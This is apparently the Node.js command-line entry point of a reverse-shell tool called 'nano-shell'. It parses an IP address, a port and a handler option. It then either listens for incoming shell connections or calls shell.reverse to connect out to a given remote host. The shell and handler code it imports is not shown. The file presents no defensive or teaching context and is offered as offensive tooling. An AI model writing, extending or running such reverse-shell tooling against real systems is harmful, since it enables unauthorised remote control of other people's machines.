var {Shell} = require("./bin/shell")
var {Handler} = require("./bin/handler")
var shell = new Shell
var handle = new Handler
var {argv} = require('yargs')
.options({
    "u" : {alias : "ip-adress" , type : "string", demandOption : false, description:"IP address"},
    "p" : {alias : "port" , type : "number", demandOption : false, description:"Port number",default : 5000},
    "h" : {alias : "handler" , type : "number", demandOption : false, description:"Listens for connections on the specified port", }

})
.usage("nano-shell -u <ip> -p <port>")
.showHelpOnFail()
 var {u, p, h} = argv

console.clear()


if (h) handle.listen(h)
if (u && p ) shell.reverse(p,u)
else {console.log("[!] missing options/values ! check nano-shell --help\n"); process.exit()}

